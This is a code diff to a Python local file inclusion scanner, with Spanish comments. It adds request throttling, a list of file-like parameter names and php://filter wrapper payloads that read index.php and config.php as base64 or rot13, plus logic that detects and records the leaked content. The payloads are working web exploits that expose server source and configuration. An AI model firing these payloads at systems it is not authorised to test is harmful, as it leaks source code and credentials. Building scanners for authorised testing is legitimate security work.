@@ -7,6 +7,11 @@ from colorama import Cursor, Fore, ansi, init
 from threading import Lock
 from parametizer.bounded_pool import run_threadpool_pending_bounded
 import os
+try:
+    from scanners.throttle import request_throttle
+except ImportError:
+    from throttle import request_throttle
+
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from vulnerability_manager import vuln_manager
 
@@ -111,6 +116,37 @@ _LFI_BYPASS_PAYLOADS: list = [
     "C:\\Windows\\System32\\drivers\\etc\\hosts",
 ]
 
+# Params con nombre sugestivo de file inclusion — habilitan prueba primaria de PHP wrappers
+_LFI_LIKELY_PARAMS: frozenset = frozenset({
+    "file", "path", "page", "template", "include", "load",
+    "read", "view", "src", "source", "doc", "document", "resource",
+    "module", "conf", "config", "layout", "theme", "tpl",
+})
+
+# PHP wrappers que se prueban como capa primaria en params con nombre LFI-like
+# php://filter devuelve contenido de archivos PHP en base64 — detectable sin error
+_PHP_WRAPPER_PRIMARY: list = [
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=../index.php",
+    "php://filter/convert.base64-encode/resource=config.php",
+    "php://filter/convert.base64-encode/resource=../config.php",
+    "php://filter/convert.base64-encode/resource=../../index.php",
+    "php://filter/read=string.rot13/resource=index.php",
+]
+
+import re as _re
+_BASE64_RE = _re.compile(r'[A-Za-z0-9+/]{80,}={0,2}')
+
+
+def _is_php_wrapper_response(text: str, baseline: str) -> bool:
+    """Detecta respuesta de php://filter: un bloque base64 largo que no estaba en el baseline."""
+    if _BASE64_RE.search(text) and not _BASE64_RE.search(baseline):
+        return True
+    # rot13: si la respuesta contiene PHP keywords rotadas (<?cuc = <?php en rot13)
+    if "<?cuc" in text or "shapgvba" in text:  # function, require en rot13
+        return True
+    return False
+
 # Indicadores de que hubo actividad de traversal (para activar bypass layer)
 _LFI_PARTIAL_INDICATORS: list = [
     'open_basedir restriction',
@@ -176,6 +212,7 @@ def lfi(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
     form_cache = {}
 
     def test_get_post(url, payload, method):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         parsed = urlparse(url)
         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
@@ -244,7 +281,43 @@ def lfi(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
                             update_progress(current, total_tasks)
                             return
 
-                # ── CAPA 2: bypass de path traversal/PHP wrappers ──────────
+                # ── CAPA 2a: PHP wrappers primaria (params con nombre LFI-like) ──
+                # Independiente de la respuesta actual — si el param se llama
+                # "file", "page", etc. probamos php://filter directamente
+                elif (r.status_code == 200
+                      and param.lower() in _LFI_LIKELY_PARAMS
+                      and not vuln_manager.is_already_exploited(base_url, param)):
+                    baseline_text = baseline_cache.get(baseline_key, "")
+                    for wp in _PHP_WRAPPER_PRIMARY:
+                        wp_data = {param: wp}
+                        try:
+                            if method == "post":
+                                rw = requests.post(base_url, data=wp_data, headers=headers,
+                                                   verify=False, timeout=timeout)
+                            else:
+                                rw = requests.get(base_url, params=wp_data, headers=headers,
+                                                  verify=False, timeout=timeout)
+                            if (rw.status_code == 200
+                                    and _is_php_wrapper_response(rw.text, baseline_text)
+                                    and not vuln_manager.is_already_exploited(base_url, param)):
+                                vuln_manager.mark_as_exploited(base_url, param)
+                                vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                                encoded = quote_plus(wp)
+                                print_vulnerability(
+                                    f"\033[1;32m[{method.upper()}-PHP-WRAPPER] [VULNERABLE]\033[0m "
+                                    f"{base_url}?{param}={encoded}"
+                                )
+                                entry = f"{base_url}?{param}={encoded}"
+                                entry += f"|||BYPASS_TECHNIQUE:PHP-WRAPPER|||BYPASS_ORIGINAL:{quote_plus(payload)}"
+                                urls_vulnerables.append(entry)
+                                with lock:
+                                    current += 1
+                                    update_progress(current, total_tasks)
+                                return
+                        except Exception:
+                            continue
+
+                # ── CAPA 2b: bypass de path traversal/PHP wrappers ──────────
                 # Solo activar si hay evidencia parcial de traversal activo
                 elif (r.status_code == 200
                       and r.text != baseline
@@ -292,6 +365,7 @@ def lfi(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
             update_progress(current, total_tasks)
 
     def test_form(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         try:
             # Cache de formularios para evitar re-parsing
